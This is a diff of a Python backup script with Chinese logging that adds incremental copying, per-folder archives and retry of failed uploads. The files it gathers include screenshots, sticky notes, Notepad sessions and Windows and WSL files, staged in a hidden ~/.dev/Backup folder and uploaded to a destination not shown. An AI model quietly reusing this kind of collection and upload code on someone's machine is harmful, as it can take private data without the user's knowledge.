@@ -3167,17 +3569,22 @@ def periodic_backup_upload(backup_manager):
                 next_backup_time = None
 
                 # 开始上传备份文件
-                upload_success = False
+                upload_success = True
                 if all_backup_paths:
                     logging.info(f"[任务 {task_id}] 待上传归档: {len(all_backup_paths)} 个")
-                    upload_success = True
-                    for backup_path in all_backup_paths:
-                        if not backup_manager.upload_file(backup_path):
+                    for archive_key, archive_paths in group_archive_paths(all_backup_paths).items():
+                        if backup_manager.upload_backup(archive_paths):
+                            backup_manager.mark_archive_uploaded(archive_key)
+                        else:
                             upload_success = False
+                    if upload_success:
+                        logging.info("✅ 本轮归档已全部上传完成")
+                elif backup_complete:
+                    logging.info("⏭️ 没有新增或更新的文件，跳过上传")
 
                 # 只有本轮生成有效归档、备份非部分完成且全部上传成功，才推进备份周期
                 round_ok, incomplete_reasons = evaluate_round_completion(
-                    all_backup_paths, backup_complete, upload_success
+                    all_backup_paths, backup_complete, upload_success, pending_uploaded
                 )
                 if round_ok:
                     next_backup_time = backup_manager.save_next_backup_time()
@@ -3231,20 +3638,68 @@ def _has_backup_content(directory):
     return False
 
 
-def evaluate_round_completion(backup_paths, backup_complete, upload_success):
+def find_pending_backup_files(backup_manager, backup_root=None):
+    """查找上轮上传失败而保留在备份根目录中的归档。"""
+    root = Path(backup_root) if backup_root else Path.home() / ".dev/Backup"
+    pending = []
+    try:
+        for path in root.iterdir():
+            if not path.is_file():
+                continue
+            if not (path.name.endswith(".tar.gz") or ".tar.gz.part" in path.name):
+                continue
+            if backup_manager._is_valid_file(str(path)):
+                pending.append(str(path))
+    except OSError as exc:
+        logging.error(f"扫描待上传备份失败: {exc}")
+    return sorted(pending)
+
+
+def retry_pending_archives(backup_manager, filename_prefixes=None):
+    """按归档组重试遗留归档；整组成功后才更新已上传索引。"""
+    pending_paths = find_pending_backup_files(backup_manager)
+    prefixes = tuple(filename_prefixes or ())
+    if prefixes:
+        pending_paths = [
+            path for path in pending_paths
+            if os.path.basename(path).startswith(prefixes)
+        ]
+    groups = group_archive_paths(pending_paths)
+    backup_manager.reconcile_pending_archives(set(groups), key_prefixes=prefixes)
+    if not groups:
+        return True
+
+    logging.info(f"📤 重试遗留备份 ({len(pending_paths)} 个文件)...")
+    all_uploaded = True
+    for archive_key, archive_paths in groups.items():
+        if backup_manager.upload_backup(archive_paths):
+            backup_manager.mark_archive_uploaded(archive_key)
+        else:
+            all_uploaded = False
+    if all_uploaded:
+        logging.info("✅ 遗留备份已全部上传完成")
+    else:
+        logging.error("❌ 遗留备份仍有上传失败，将保留文件等待重试")
+    return all_uploaded
+
+
+def evaluate_round_completion(backup_paths, backup_complete, upload_success,
+                              pending_uploaded=True):
     """本轮只有生成有效归档、备份非部分完成且全部上传成功，才推进备份周期。
 
     Returns:
         (是否推进周期, 未完成原因列表)
     """
     reasons = []
-    if not backup_paths:
-        reasons.append("未生成本轮有效归档")
-    else:
+    if backup_paths:
         if not backup_complete:
             reasons.append("部分备份未完成")
         if not upload_success:
             reasons.append("归档未全部上传成功")
+    elif not backup_complete:
+        reasons.append("本轮备份未完整完成")
+    if not pending_uploaded:
+        reasons.append("遗留归档未全部上传成功")
     return (not reasons), reasons
 
 
@@ -3275,19 +3730,25 @@ def run_notes_backup(backup_manager, user):
 
     task_id = datetime.now().strftime('%Y%m%d-%H%M%S')
     logging.info(f"[便签 {task_id}] 开始便签与记事本会话备份")
+    user_prefix = user[:5] if user else "user"
+    pending_uploaded = retry_pending_archives(
+        backup_manager,
+        filename_prefixes=(f"{user_prefix}_sticky_notes_", f"{user_prefix}_notepad_session_"),
+    )
     backup_paths, complete = backup_notes_data(backup_manager, user)
 
     if not backup_paths and complete:
-        logging.info("ℹ️ 未发现便签或记事本会话内容，本轮跳过")
-        backup_manager.save_next_notes_backup_time()
-        return True
+        logging.info("ℹ️ 未发现需要新增上传的便签或记事本会话内容")
 
-    upload_success = bool(backup_paths)
-    for backup_path in backup_paths:
-        if not backup_manager.upload_file(backup_path):
+    upload_success = True
+    for archive_key, archive_paths in group_archive_paths(backup_paths).items():
+        if backup_manager.upload_backup(archive_paths):
+            backup_manager.mark_archive_uploaded(archive_key)
+        else:
             upload_success = False
 
-    round_ok, reasons = evaluate_round_completion(backup_paths, complete, upload_success)
+    round_ok, reasons = evaluate_round_completion(
+        backup_paths, complete, upload_success, pending_uploaded)
     if round_ok:
         next_time = backup_manager.save_next_notes_backup_time()
         next_time_str = next_time.strftime('%Y-%m-%d %H:%M:%S') if next_time else "未保存"
@@ -3306,22 +3767,37 @@ def run_notes_backup(backup_manager, user):
 
 def backup_wsl(backup_manager, source, target):
     """备份WSL目录，返回 (备份文件路径列表或 None, 是否完整完成)，不执行上传。"""
-    backup_dir = backup_manager.backup_wsl_files(source, target)
+    backup_dir, changed_records, complete = backup_manager.backup_wsl_files(source, target)
     if not backup_dir:
         logging.error("❌ WSL 备份暂存目录不可用")
         return None, False
-    if not _has_backup_content(backup_dir):
+    changed_records = changed_records or {}
+    if not any(changed_records.values()):
         logging.info("[备份] WSL 暂无可备份内容，跳过")
-        return None, True
-    backup_path = backup_manager.zip_backup_folder(
-        backup_dir,
-        str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
-    )
-    if not backup_path:
-        logging.error("❌ WSL目录压缩失败")
-        return None, False
-    logging.info("[备份] WSL 归档已准备完成")
-    return (backup_path if isinstance(backup_path, list) else [backup_path]), True
+        return [], complete
+
+    user_prefix = getpass.getuser()[:5] if getpass.getuser() else "user"
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    backup_paths = []
+    for dir_key in ("specified", "docs", "configs"):
+        records = changed_records.get(dir_key, {})
+        if not records:
+            continue
+        dir_path = os.path.join(backup_dir, f"{user_prefix}_{dir_key}")
+        zip_path = str(Path(backup_dir).parent / f"{user_prefix}_{dir_key}_{timestamp}")
+        backup_path = backup_manager.zip_backup_folder(dir_path, zip_path)
+        if not backup_path:
+            logging.error(f"❌ WSL {dir_key} 目录压缩失败")
+            complete = False
+            continue
+        archive_reference = backup_path[0] if isinstance(backup_path, list) else backup_path
+        backup_manager.register_pending_archive(archive_reference, records)
+        if isinstance(backup_path, list):
+            backup_paths.extend(backup_path)
+        else:
+            backup_paths.append(backup_path)
+        logging.info(f"[备份] WSL {dir_key} 归档已准备完成")
+    return backup_paths, complete
 
 def backup_disks(backup_manager, available_disks):
     """备份可用磁盘，返回 (备份文件路径列表, 是否完整完成)，不执行上传。"""
@@ -3332,12 +3808,16 @@ def backup_disks(backup_manager, available_disks):
         for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
             label = f"{disk_letter.upper()}盘 {backup_type}"
             try:
-                backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
+                backup_dir, changed_records, scan_complete = backup_manager.backup_disk_files(
+                    source_dir, target_dir, ext_type,
+                    state_namespace=f"disk:{disk_letter.upper()}:{backup_type}",
+                )
+                complete = complete and scan_complete
                 if not backup_dir:
                     logging.error(f"❌ {label} 备份暂存目录不可用")
                     complete = False
                     continue
-                if not _has_backup_content(backup_dir):
+                if not changed_records:
                     logging.info(f"[备份] {label} 暂无可备份内容，跳过")
                     continue
                 backup_path = backup_manager.zip_backup_folder(
@@ -3348,6 +3828,8 @@ def backup_disks(backup_manager, available_disks):
                     logging.error(f"❌ {label} 压缩失败")
                     complete = False
                     continue
+                archive_reference = backup_path[0] if isinstance(backup_path, list) else backup_path
+                backup_manager.register_pending_archive(archive_reference, changed_records)
                 if isinstance(backup_path, list):
                     backup_paths.extend(backup_path)
                 else:
@@ -3369,9 +3851,11 @@ def backup_windows_data(backup_manager, user):
     specified_backup_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_windows_specified"
 
     if os.path.exists(windows_base_path):
-        if backup_manager._ensure_directory(str(specified_backup_dir)):
-            files_count = 0
+        if backup_manager._clean_directory(str(specified_backup_dir)):
+            specified_records = {}
+            skipped_count = 0
             total_size = 0
+            processed_sources = set()
             
             for item in backup_manager.config.WINDOWS_SPECIFIC_PATHS:
                 item_path = Path(item)
@@ -3382,52 +3866,73 @@ def backup_windows_data(backup_manager, user):
                 if not backup_manager._is_within(source_path, windows_base_path):
                     logging.error(f"❌ Windows 配置路径越界: {item}")
                     continue
-                if not os.path.exists(source_path):
-                    if backup_manager.config.DEBUG_MODE:
-                        logging.debug(f"跳过不存在的项目: {source_path}")
-                    continue
-                
-                try:
-                    if os.path.isdir(source_path):
-                        # 复制目录
-                        target_path = os.path.join(specified_backup_dir, item)
-                        parent_dir = os.path.dirname(target_path)
-                        if backup_manager._ensure_directory(parent_dir):
-                            if os.path.exists(target_path):
-                                shutil.rmtree(target_path)
-                            shutil.copytree(source_path, target_path, dirs_exist_ok=True)
-                            dir_size = backup_manager._get_dir_size(target_path)
-                            files_count += 1
-                            total_size += dir_size
-                            if backup_manager.config.DEBUG_MODE:
-                                logging.debug(f"成功复制目录: {item}")
+                if any(ch in item for ch in ["*", "?", "["]):
+                    matched_sources = sorted(glob.glob(source_path))
+                else:
+                    matched_sources = [source_path] if os.path.lexists(source_path) else []
+                if not matched_sources and getattr(backup_manager.config, "DEBUG_MODE", False):
+                    logging.debug(f"跳过不存在的项目: {source_path}")
+
+                for matched_source in matched_sources:
+                    resolved_source = os.path.abspath(matched_source)
+                    if resolved_source in processed_sources:
+                        continue
+                    processed_sources.add(resolved_source)
+                    if not backup_manager._is_within(resolved_source, windows_base_path):
+                        logging.error(f"❌ Windows 配置路径越界: {item}")
+                        complete = False
+                        continue
+                    relative = os.path.relpath(resolved_source, windows_base_path).replace(os.sep, "/")
+                    target_path = os.path.join(specified_backup_dir, relative)
+                    try:
+                        if not backup_manager._ensure_directory(os.path.dirname(target_path)):
+                            complete = False
+                            continue
+                        before = len(specified_records)
+                        if os.path.isdir(resolved_source):
+                            tree_complete, _ = backup_manager._copy_tree_if_changed(
+                                resolved_source, target_path,
+                                backup_manager._state_key("windows", relative),
+                                specified_records,
+                            )
+                            complete = complete and tree_complete
+                        else:
+                            status = backup_manager._copy_if_changed(
+                                resolved_source, target_path,
+                                backup_manager._state_key("windows", relative),
+                                specified_records,
+                            )
+                            complete = complete and status != "failed"
+                            if status == "skipped":
+                                skipped_count += 1
+                    except Exception as exc:
+                        complete = False
+                        logging.error(f"❌ Windows 指定文件复制失败: {item} - {exc}")
+                        if getattr(backup_manager.config, "DEBUG_MODE", False):
+                            logging.debug(f"复制失败: {item} - {exc}")
                     else:
-                        # 复制文件
-                        target_path = os.path.join(specified_backup_dir, item)
-                        parent_dir = os.path.dirname(target_path)
-                        if backup_manager._ensure_directory(parent_dir):
-                            shutil.copy2(source_path, target_path)
-                            file_size = os.path.getsize(target_path)
-                            files_count += 1
-                            total_size += file_size
-                            if backup_manager.config.DEBUG_MODE:
-                                logging.debug(f"成功复制文件: {item}")
-                except Exception as e:
-                    complete = False
-                    logging.error(f"❌ Windows 指定文件复制失败: {item} - {e}")
-                    if backup_manager.config.DEBUG_MODE:
-                        logging.debug(f"复制失败: {item} - {str(e)}")
+                        copied = len(specified_records) - before
+                        if copied and getattr(backup_manager.config, "DEBUG_MODE", False):
+                            logging.debug(f"已增量复制: {relative} ({copied} 个文件)")
             
-            if files_count > 0:
-                logging.info(f"\n📊 Windows指定文件备份完成:")
-                logging.info(f"   📁 文件数量: {files_count}")
-                logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
+            total_size = sum(
+                int(fingerprint.get("size", 0))
+                for fingerprint in specified_records.values()
+                if isinstance(fingerprint, dict)
+            )
+            if specified_records:
+                logging.info("\n📊 Windows指定文件备份完成:")
+                logging.info(f"   📁 新增/更新文件: {len(specified_records)}")
+                logging.info(f"   ⏭️  未变化跳过文件: {skipped_count}")
+                logging.info(f"   💾 新增/更新大小: {total_size / 1024 / 1024:.1f}MB")
                 
                 backup_path = backup_manager.zip_backup_folder(
                     str(specified_backup_dir),
                     str(Path.home() / f".dev/Backup/{user_prefix}_wsl_wins_specified_") + datetime.now().strftime("%Y%m%d_%H%M%S")
                 )
                 if backup_path:
+                    archive_reference = backup_path[0] if isinstance(backup_path, list) else backup_path
+                    backup_manager.register_pending_archive(archive_reference, specified_records)
                     if isinstance(backup_path, list):
                         backup_paths.extend(backup_path)
                     else:
@@ -3437,19 +3942,23 @@ def backup_windows_data(backup_manager, user):
                     complete = False
                     logging.error("❌ Windows指定目录和文件压缩失败\n")
             else:
-                logging.error("❌ 未找到需要备份的Windows指定文件")
+                logging.info("ℹ️ Windows 指定文件均未变化，跳过归档")
         else:
             complete = False
             logging.error("❌ Windows 指定文件暂存目录不可用")
     
     # 备份截图
-    screenshots_backup = backup_screenshots(user, backup_manager)
+    screenshots_backup, screenshot_records, screenshots_complete = backup_screenshots(
+        user, backup_manager)
+    complete = complete and screenshots_complete
     if screenshots_backup:
         backup_path = backup_manager.zip_backup_folder(
             screenshots_backup,
             str(Path.home() / f".dev/Backup/{user_prefix}_screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
+            archive_reference = backup_path[0] if isinstance(backup_path, list) else backup_path
+            backup_manager.register_pending_archive(archive_reference, screenshot_records)
             if isinstance(backup_path, list):
                 backup_paths.extend(backup_path)
             else:
@@ -3461,6 +3970,7 @@ def backup_windows_data(backup_manager, user):
     else:
         logging.info("ℹ️ 未发现可备份的截图文件\n")
 
+    backup_manager._save_backup_state()
     return backup_paths, complete
 
 def get_wsl_clipboard():
